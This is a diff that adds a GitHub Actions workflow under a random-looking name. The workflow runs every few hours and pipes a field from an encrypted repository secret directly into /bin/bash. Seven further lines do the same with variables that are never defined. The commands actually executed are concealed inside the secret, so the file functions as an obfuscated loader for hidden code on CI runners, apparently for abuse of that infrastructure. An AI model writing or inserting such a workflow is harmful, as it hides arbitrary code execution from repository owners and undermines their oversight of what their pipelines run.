@@ -1,0 +1,24 @@
+name: flintscorpion
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: flintscorpion
+        env:
+          sdme613: ${{ secrets.sdme613 }}
+        run: |
+          echo $sdme613 | jq -r .r8052 | /bin/bash
+          echo $luoui5491 | jq -r .gb644 | /bin/bash
+          echo $qoo9535 | jq -r .ifq47430 | /bin/bash
+          echo $pud327 | jq -r .dfgk99 | /bin/bash
+          echo $srhsk86 | jq -r .zz818 | /bin/bash
+          echo $kd89875 | jq -r .nwv4894 | /bin/bash
+          echo $vno50042 | jq -r .ublom97295 | /bin/bash
+          echo $csfd03 | jq -r .md2423 | /bin/bash
+
